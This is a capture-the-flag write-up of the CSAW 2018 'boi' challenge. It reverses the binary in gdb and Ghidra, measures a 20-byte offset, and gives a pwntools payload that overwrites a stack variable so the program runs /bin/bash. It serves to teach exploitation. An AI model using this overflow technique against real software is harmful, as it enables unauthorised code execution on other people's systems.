# Csaw18 Boi

When I ran the binary I saw the prompt "Are you a big boiiiii??". When I typed "yes" in the buffer, the binary output a formated date and time:

```bash
root-at-iyn@Ubuntu-220403-x86-64:~/Nightmare/BufferOverflow/Variable/Boi$ ./boi
Are you a big boiiiii??
yes
Sun  7 Sep 00:50:32 BST 2025
```
Taking a step back I checked how the binary is compiled using the file command and checksec:

```bash
root-at-iyn@Ubuntu-220403-x86-64:~/Nightmare/BufferOverflow/Variable/Boi$ file ./boi && checksec ./boi
./boi: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=1537584f3b2381e1b575a67cba5fbb87878f9711, not stripped
[*] '/home/root-at-iyn/Nightmare/BufferOverflow/Variable/Boi/boi'
    Arch:       amd64-64-little
    RELRO:      Partial RELRO
    Stack:      Canary found
    NX:         NX enabled
    PIE:        No PIE (0x400000)
    Stripped:   No
```

From the output it looks like we have a 64bit ELF with a stack canary and non-execuatable stack but no PIE. The binary is not stripped so I ran it through gdb and disassembled main:

```bash
gef➤  disass main
Dump of assembler code for function main:
   0x0000000000400641 <+0>:	push   rbp
   0x0000000000400642 <+1>:	mov    rbp,rsp
   0x0000000000400645 <+4>:	sub    rsp,0x40
   0x0000000000400649 <+8>:	mov    DWORD PTR [rbp-0x34],edi
   0x000000000040064c <+11>:	mov    QWORD PTR [rbp-0x40],rsi
   0x0000000000400650 <+15>:	mov    rax,QWORD PTR fs:0x28
   0x0000000000400659 <+24>:	mov    QWORD PTR [rbp-0x8],rax
   0x000000000040065d <+28>:	xor    eax,eax
   0x000000000040065f <+30>:	mov    QWORD PTR [rbp-0x30],0x0
   0x0000000000400667 <+38>:	mov    QWORD PTR [rbp-0x28],0x0
   0x000000000040066f <+46>:	mov    QWORD PTR [rbp-0x20],0x0
   0x0000000000400677 <+54>:	mov    DWORD PTR [rbp-0x18],0x0
   0x000000000040067e <+61>:	mov    DWORD PTR [rbp-0x1c],0xdeadbeef
   0x0000000000400685 <+68>:	mov    edi,0x400764
   0x000000000040068a <+73>:	call   0x4004d0 <puts@plt>
   0x000000000040068f <+78>:	lea    rax,[rbp-0x30]
   0x0000000000400693 <+82>:	mov    edx,0x18
   0x0000000000400698 <+87>:	mov    rsi,rax
   0x000000000040069b <+90>:	mov    edi,0x0
   0x00000000004006a0 <+95>:	call   0x400500 <read@plt>
   0x00000000004006a5 <+100>:	mov    eax,DWORD PTR [rbp-0x1c]
   0x00000000004006a8 <+103>:	cmp    eax,0xcaf3baee
   0x00000000004006ad <+108>:	jne    0x4006bb <main+122>
   0x00000000004006af <+110>:	mov    edi,0x40077c
   0x00000000004006b4 <+115>:	call   0x400626 <run_cmd>
   0x00000000004006b9 <+120>:	jmp    0x4006c5 <main+132>
   0x00000000004006bb <+122>:	mov    edi,0x400786
   0x00000000004006c0 <+127>:	call   0x400626 <run_cmd>
   0x00000000004006c5 <+132>:	mov    eax,0x0
   0x00000000004006ca <+137>:	mov    rcx,QWORD PTR [rbp-0x8]
   0x00000000004006ce <+141>:	xor    rcx,QWORD PTR fs:0x28
   0x00000000004006d7 <+150>:	je     0x4006de <main+157>
   0x00000000004006d9 <+152>:	call   0x4004e0 <__stack_chk_fail@plt>
   0x00000000004006de <+157>:	leave
   0x00000000004006df <+158>:	ret
End of assembler dump.

```

## Reversing

- The first argument to main ends up in rbp-0x34, and the second argument in rbp-0x40
- A value from the fs (0x28) is copied to rax and ends up in rbp-0x8 (stack cookie)
- rbp-0x30, rbp-0x28, and rbp-0x18 are set to 0x0. The mov instruction used was of type PTR, so 8 bytes of 0x0 will be assigned to rbp-0x30 and rbp-0x28. 4 0x0 bytes will be assigned to rbp-0x18.
- rbp-0x1c is set to 0xdeadbeef
- We see a call to puts with an arg of 0x400764
- A call to `read` is made at main<+95> with the first arg 0x0 (fd), second arg rbp-0x30 (buff), 3rd arg 0x18 (24 bytes). The number of bytes read is returned to rbp-0x30.
- After the call to read rbp-0x1c (0xdeadbeef) is compared 0xcaf3baee. If it is not equal we jump to main<+122> where 0x400786 is given as an argument to run_cmd.
- If the comparison was equal then 0x40077c is given as an argument to run_cmd

I checked the disassembly in ghidra to to see if I was on the right path: 

```c
undefined8 main(void)

{
  long in_FS_OFFSET;
  undefined8 local_38;
  undefined8 local_30;
  undefined4 local_28;
  int iStack_24;
  undefined4 local_20;
  long local_10;

  local_10 = *(long *)(in_FS_OFFSET + 0x28);
  local_38 = 0;
  local_30 = 0;
  local_20 = 0;
  local_28 = 0;
  iStack_24 = -0x21524111;
  puts("Are you a big boiiiii??");
  read(0,&local_38,0x18);
  if (iStack_24 == -0x350c4512) {
    run_cmd("/bin/bash");
  }
  else {
    run_cmd("/bin/date");
  }
  if (local_10 != *(long *)(in_FS_OFFSET + 0x28)) {
                    /* WARNING: Subroutine does not return */
    __stack_chk_fail();
  }
  return 0;
}

```

So it looks like the main part of the program we neeed to solve is changing iStack_24 (rbp-0x1c) to match 0xcaf3baee. If we can set this value then we'll get the program to run `/bin/bash`. The first thing I wanted to check is where my input would land on the stack. I think rbp-0x30 will likely be a pointer to where the input char array is stored. We can verify this in gdb. I'll send 23 A's and a newline character as input then inspect the stack. In gdb I'll break at main<+103>. Its also worth mentioning, the reason why I'm using 24 bytes as input is because the call to read has a size of 24 bytes (0x18)

```bash
gef➤  b *main+103
Breakpoint 1 at 0x4006a8
gef➤  r
Starting program: /home/root-at-iyn/Nightmare/BufferOverflow/Variable/Boi/boi
[Thread debugging using libthread_db enabled]
Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1".
Are you a big boiiiii??
AAAAAAAAAAAAAAAAAAAAAAA
```
```bash
[ Legend: Modified register | Code | Heap | Stack | String ]
───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── registers ────
$rax   : 0xa414141         
$rbx   : 0x0               
$rcx   : 0x00007ffff7d147e2  →  0x5677fffff0003d48 ("H="?)
$rdx   : 0x18              
$rsp   : 0x00007fffffffdf00  →  0x00007fffffffe058  →  0x00007fffffffe38a  →  "/home/root-at-iyn/Nightmare/BufferOverflow/Variabl[...]"
$rbp   : 0x00007fffffffdf40  →  0x0000000000000001
$rsi   : 0x00007fffffffdf10  →  "AAAAAAAAAAAAAAAAAAAAAAA\n"
$rdi   : 0x0               
$rip   : 0x00000000004006a8  →  <main+0067> cmp eax, 0xcaf3baee
$r8    : 0x0               
$r9    : 0x00000000006022a0  →  "Are you a big boiiiii??\n"
$r10   : 0x00007ffff7c065e8  →  0x000f001200001a64
$r11   : 0x246             
$r12   : 0x00007fffffffe058  →  0x00007fffffffe38a  →  "/home/root-at-iyn/Nightmare/BufferOverflow/Variabl[...]"
$r13   : 0x0000000000400641  →  <main+0000> push rbp
$r14   : 0x0               
$r15   : 0x00007ffff7ffd040  →  0x00007ffff7ffe2e0  →  0x0000000000000000
$eflags: [zero CARRY PARITY adjust sign trap INTERRUPT direction overflow resume virtualx86 identification]
$cs: 0x33 $ss: 0x2b $ds: 0x00 $es: 0x00 $fs: 0x00 $gs: 0x00 
───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── stack ────
0x00007fffffffdf00│+0x0000: 0x00007fffffffe058  →  0x00007fffffffe38a  →  "/home/root-at-iyn/Nightmare/BufferOverflow/Variabl[...]"	 ← $rsp
0x00007fffffffdf08│+0x0008: 0x0000000100000000
0x00007fffffffdf10│+0x0010: "AAAAAAAAAAAAAAAAAAAAAAA\n"	 ← $rsi
0x00007fffffffdf18│+0x0018: "AAAAAAAAAAAAAAA\n"
0x00007fffffffdf20│+0x0020: "AAAAAAA\n"
0x00007fffffffdf28│+0x0028: 0x0000000000000000
0x00007fffffffdf30│+0x0030: 0x0000000000000000
0x00007fffffffdf38│+0x0038: 0xd41e5fac92e61b00
─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── code:x86:64 ────
     0x40069b <main+005a>      mov    edi, 0x0
     0x4006a0 <main+005f>      call   0x400500 <read@plt>
     0x4006a5 <main+0064>      mov    eax, DWORD PTR [rbp-0x1c]
 →   0x4006a8 <main+0067>      cmp    eax, 0xcaf3baee
     0x4006ad <main+006c>      jne    0x4006bb <main+122>
     0x4006af <main+006e>      mov    edi, 0x40077c
     0x4006b4 <main+0073>      call   0x400626 <run_cmd>
     0x4006b9 <main+0078>      jmp    0x4006c5 <main+132>
     0x4006bb <main+007a>      mov    edi, 0x400786
─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── threads ────
[#0] Id 1, Name: "boi", stopped 0x4006a8 in main (), reason: BREAKPOINT
───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── trace ────
[#0] 0x4006a8 → main()

```

We can see a snapshot of the registers, stack and disassembly. The program is at the breakpoint before the `cmp` instruction which will compare the contents of rbp-0x1c and 0xcaf3baee. If we inspect the stack now and look at rbp-0x1c, we'll see that we have overwritten the original value:

```bash
gef➤  x/a $rbp-0x1c
0x7fffffffdf24:	0xa414141
```
```bash
gef➤  x/10gx $rsp
0x7fffffffdf00:	0x00007fffffffe058	0x0000000100000000
0x7fffffffdf10:	0x4141414141414141	0x4141414141414141
0x7fffffffdf20:	0x0a41414141414141	0x0000000000000000
0x7fffffffdf30:	0x0000000000000000	0xd41e5fac92e61b00
0x7fffffffdf40:	0x0000000000000001	0x00007ffff7c29d90
```
So from this output we can see that we need 20 bytes (0x7fffffffdf24 - 0x7fffffffdf10) to reach rbp-0x1c. I'll write a python script to send the 20 bytes and append it with 0xcaf3baee.

```python
from pwn import * 

target = process("./boi")

payload = b"A" * 20 + p32(0xcaf3baee)

target.send(payload)

target.interactive()

```

When we run the file we see that have bash shell access: 

```bash
root-at-iyn@Ubuntu-220403-x86-64:~/Nightmare/BufferOverflow/Variable/Boi$ python3 exploit_boi.py 
[+] Starting local process './boi': pid 35769
[*] Switching to interactive mode
Are you a big boiiiii??
$ 
$ id
uid=1000(root-at-iyn) gid=1000(root-at-iyn) groups=1000(root-at-iyn),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),122(lpadmin),135(lxd),136(sambashare)

```

